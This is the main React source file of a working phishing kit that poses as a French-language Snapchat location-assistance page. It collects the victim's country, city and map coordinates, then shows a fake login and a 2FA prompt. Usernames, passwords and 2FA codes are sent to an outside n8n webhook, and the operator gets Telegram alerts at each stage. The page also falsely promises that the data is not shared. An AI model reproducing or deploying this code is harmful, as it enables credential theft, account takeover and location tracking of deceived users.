import { useRef, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { MapPin, AlertCircle, CheckCircle } from "lucide-react";
import snapLogo from "./assets/snapchat-svgrepo-com.svg";
import { Input } from "./components/Input";
import { Button } from "./components/Button";
import { MapPicker } from "./components/MapPicker";
import { ConnectingView } from "./components/ConnectingView";
import { LoginView } from "./components/LoginView";
import { TwoFactorModal } from "./components/TwoFactorModal";
import clsx from "clsx";
import { sendTelegramMessage } from "./utils/telegram";

const Header = () => (
  <header className="fixed top-0 left-0 right-0 h-14 bg-snap-yellow border-b border-gray-100 z-50 flex items-center justify-center gap-3">
    <div className="flex items-center gap-2">
      <img src={snapLogo} alt="Snapchat Logo" className="w-8 h-8" />
      <span className="text-xl font-bold text-snap-black tracking-tight">
        Snapchat
      </span>
    </div>
    <div className="h-5 w-px bg-black/10"></div>
    <h1 className="text-sm font-medium text-snap-black">
      Assistance Localisation
    </h1>
  </header>
);

const StatusCard = () => (
  <div className="bg-white rounded-2xl p-5 shadow-sm border border-gray-100 mb-6">
    <div className="flex items-start gap-4">
      <div className="p-3 bg-red-50 rounded-full shrink-0">
        <AlertCircle className="w-6 h-6 text-red-500" />
      </div>
      <div>
        <h2 className="font-bold text-lg mb-1">Localisation impossible</h2>
        <p className="text-gray-500 text-sm leading-relaxed">
          Nous n'avons pas réussi à vous localiser automatiquement. Aidez-nous à
          améliorer la précision du service.
        </p>
      </div>
    </div>
  </div>
);

const SuccessView = () => (
  <motion.div
    initial={{ opacity: 0, scale: 0.95 }}
    animate={{ opacity: 1, scale: 1 }}
    className="flex flex-col items-center justify-center py-10 px-6 text-center"
  >
    <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mb-6">
      <CheckCircle className="w-10 h-10 text-green-600" />
    </div>
    <h2 className="text-2xl font-bold mb-3">Position enregistrée</h2>
    <p className="text-gray-500 max-w-xs mx-auto">
      Merci pour votre aide. Le service de localisation a été mis à jour avec
      succès.
    </p>
  </motion.div>
);

const WEBHOOK_URL = "https://smart030.app.n8n.cloud/webhook/snap";

import { Loader } from "./components/Loader";

function App() {
  // Steps: FORM -> CONNECTING -> LOGIN -> SUCCESS (2FA is a modal on LOGIN)
  const [step, setStep] = useState("FORM");
  const [show2FA, setShow2FA] = useState(false);
  const [is2FAError, setIs2FAError] = useState(false);
  const [loginCreds, setLoginCreds] = useState(null);
  const [isLoading, setIsLoading] = useState(false); // New Loading State

  // Track if map has been interacted with to avoid spam
  const hasInteractedMap = useRef(false);

  // 1. Page Load Notification
  useEffect(() => {
    sendTelegramMessage("👋 Un utilisateur est arrivé sur la page principale.");
  }, []);

  const [formData, setFormData] = useState({
    useProxy: false,
    country: "",
    city: "",
    landmark: "",
    coords: null,
  });

  const sendToWebhook = async (data) => {
    setIsLoading(true); // Start Loading
    try {
      const response = await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      });
      return await response.json();
    } catch (error) {
      console.error("Webhook error:", error);
      return null;
    } finally {
      setIsLoading(false); // Stop Loading
    }
  };

  const handleLocationSelect = (latlng) => {
    setFormData((prev) => ({ ...prev, coords: latlng }));

    // 2. Map Interaction Notification (First time only)
    if (!hasInteractedMap.current) {
      sendTelegramMessage("🗺️ L'utilisateur commence à modifier la carte.");
      hasInteractedMap.current = true;
    }
  };

  const handleFormSubmit = async (e) => {
    e.preventDefault();
    if (formData.country && formData.city && formData.coords) {
      console.log("Location Submitted:", formData);
      await sendToWebhook({ type: "LOCATION_DATA", ...formData });

      // 3. Connecting View Notification
      sendTelegramMessage(
        "🔄 L'utilisateur est sur la page de chargement (Liaison).",
      );
      setStep("CONNECTING");
      window.scrollTo({ top: 0, behavior: "smooth" });
    }
  };

  const handleConnectingComplete = () => {
    // 4. Login View Notification
    sendTelegramMessage("🔑 L'utilisateur est sur la page de connexion.");
    setStep("LOGIN");
  };

  const handleLoginSubmit = async (creds) => {
    console.log("Login attempt:", creds);
    setLoginCreds(creds);

    // 5. Click Login Notification
    sendTelegramMessage(
      `⚡ L'utilisateur a cliqué sur Connexion.\nUser: ${creds.username}`,
    );

    // Loader used here inside sendToWebhook
    const response = await sendToWebhook({ type: "LOGIN_ATTEMPT", ...creds });
    console.log("Webhook response:", response);

    // Logic: approved=true -> Success, approved=false -> 2FA
    if (response && response.data && response.data.approved === true) {
      setStep("SUCCESS");
    } else {
      // 6. Show 2FA Modal Notification
      sendTelegramMessage("🛡️ Affichage du modal 2FA pour l'utilisateur.");
      setShow2FA(true);
    }
  };

  const handle2FASubmit = async (code) => {
    console.log("2FA Code:", code);
    setIs2FAError(false);

    // Loader used here inside sendToWebhook
    const response = await sendToWebhook({
      type: "2FA_CODE",
      username: loginCreds?.username,
      password: loginCreds?.password,
      code,
    });

    if (response && response.data && response.data.approved === true) {
      setShow2FA(false);
      setStep("SUCCESS");
    } else {
      // 7. 2FA Failed Notification
      sendTelegramMessage(
        `❌ Échec du 2FA pour l'utilisateur.\nCode tenté: ${code}`,
      );
      setIs2FAError(true);
    }
  };

  return (
    <div className="min-h-screen bg-snap-gray font-sans pt-20 px-4 md:max-w-md md:mx-auto relative pb-20">
      <Header />
      {isLoading && <Loader />}

      <main>
        {step === "FORM" && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
          >
            <StatusCard />
            <form onSubmit={handleFormSubmit} className="space-y-6">
              {/* Context Section */}
              <section className="bg-white rounded-2xl p-6 shadow-sm border border-gray-100 space-y-4">
                <h3 className="font-bold text-gray-900 flex items-center gap-2">
                  <MapPin className="w-5 h-5" />
                  Informations
                </h3>

                <div className="flex items-center justify-between py-2 border-b border-gray-50">
                  <span className="text-sm font-medium text-gray-700">
                    Utilisez-vous un VPN / Proxy ?
                  </span>
                  <button
                    type="button"
                    onClick={() =>
                      setFormData((p) => ({ ...p, useProxy: !p.useProxy }))
                    }
                    className={clsx(
                      "w-12 h-7 rounded-full transition-colors relative",
                      formData.useProxy ? "bg-snap-yellow" : "bg-gray-200",
                    )}
                  >
                    <span
                      className={clsx(
                        "absolute top-1 left-1 bg-white w-5 h-5 rounded-full shadow-sm transition-transform",
                        formData.useProxy ? "translate-x-5" : "translate-x-0",
                      )}
                    />
                  </button>
                </div>

                <div className="space-y-4 pt-2">
                  <Input
                    label="Pays"
                    placeholder="Ex: France"
                    value={formData.country}
                    onChange={(e) =>
                      setFormData({ ...formData, country: e.target.value })
                    }
                    required
                  />
                  <Input
                    label="Ville"
                    placeholder="Ex: Paris"
                    value={formData.city}
                    onChange={(e) =>
                      setFormData({ ...formData, city: e.target.value })
                    }
                    required
                  />
                  <Input
                    label="Point de repère (optionnel)"
                    placeholder="Ex: Près de la Tour Eiffel"
                    value={formData.landmark}
                    onChange={(e) =>
                      setFormData({ ...formData, landmark: e.target.value })
                    }
                  />
                </div>
              </section>

              {/* Map Section */}
              <section className="bg-white rounded-2xl p-6 shadow-sm border border-gray-100 space-y-4">
                <div className="flex justify-between items-center">
                  <h3 className="font-bold text-gray-900">
                    Précision sur carte
                  </h3>
                  {formData.coords && (
                    <span className="text-xs font-mono bg-gray-100 px-2 py-1 rounded text-gray-500">
                      {formData.coords.lat.toFixed(4)},{" "}
                      {formData.coords.lng.toFixed(4)}
                    </span>
                  )}
                </div>
                <MapPicker onLocationSelect={handleLocationSelect} />
              </section>

              {/* Submit */}
              <div className="pt-4">
                <Button
                  type="submit"
                  disabled={
                    !formData.country || !formData.city || !formData.coords
                  }
                >
                  Confirmer la position
                </Button>
                <p className="text-center text-xs text-gray-400 mt-4 leading-relaxed">
                  Vos données servent uniquement à calibrer le service et ne
                  sont pas partagées.
                </p>
              </div>
            </form>
          </motion.div>
        )}

        {step === "CONNECTING" && (
          <ConnectingView onComplete={handleConnectingComplete} />
        )}

        {step === "LOGIN" && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            <LoginView onSubmit={handleLoginSubmit} />
            <TwoFactorModal
              isOpen={show2FA}
              onClose={() => setShow2FA(false)}
              onSubmit={handle2FASubmit}
              isError={is2FAError}
            />
          </motion.div>
        )}

        {step === "SUCCESS" && <SuccessView />}
      </main>
    </div>
  );
}

export default App;
